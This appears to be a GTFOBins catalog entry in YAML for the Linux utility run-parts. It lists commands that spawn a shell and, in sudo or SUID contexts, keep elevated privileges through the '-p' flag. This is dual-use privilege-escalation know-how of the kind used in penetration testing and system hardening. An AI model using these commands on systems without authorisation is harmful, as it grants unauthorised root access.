<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/run-parts -->
---
functions:
  shell:
  - code: |-
      run-parts --new-session --regex '^sh$' /bin
    contexts:
      sudo:
      suid:
        code: |-
          run-parts --new-session --regex '^sh$' /bin --arg='-p'
        shell: false
      unprivileged:
  - code: |-
      cp /bin/sh /path/to/temp-dir/
      run-parts /path/to/temp-dir/
    contexts:
      sudo:
      suid:
        code: |-
          cp /bin/sh /path/to/temp-dir/
          run-parts /path/to/temp-dir/ --arg='-p'
        shell: false
      unprivileged:
...
